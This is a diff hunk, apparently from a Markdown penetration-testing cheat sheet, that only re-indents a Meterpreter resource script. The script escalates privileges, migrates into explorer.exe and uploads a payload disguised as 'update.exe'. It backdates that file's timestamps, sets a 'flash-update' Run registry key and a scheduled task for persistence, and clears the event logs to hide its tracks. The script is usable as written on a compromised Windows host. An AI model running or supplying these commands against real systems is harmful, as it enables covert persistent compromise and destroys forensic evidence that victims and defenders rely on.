@@ -157,14 +157,14 @@
 - **Resource script to elevate session, migrate, persiste payload and clear tracks::**`[persistence.rc]`<br />
 
 ```
-   getprivs
-   getsystem
-   migrate -n explorer.exe
-      upload update.exe %temp%\\update.exe
-      timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe
-      reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
-      scheduleme -m 10 -c "%temp%\\update.exe"
-   clearev
+ getprivs
+ getsystem
+ migrate -n explorer.exe
+  upload update.exe %temp%\\update.exe
+  timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe
+  reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
+  scheduleme -m 10 -c "%temp%\\update.exe"
+ clearev
 ```
 `[run] meterpreter >` resource /root/persistence.rc
 
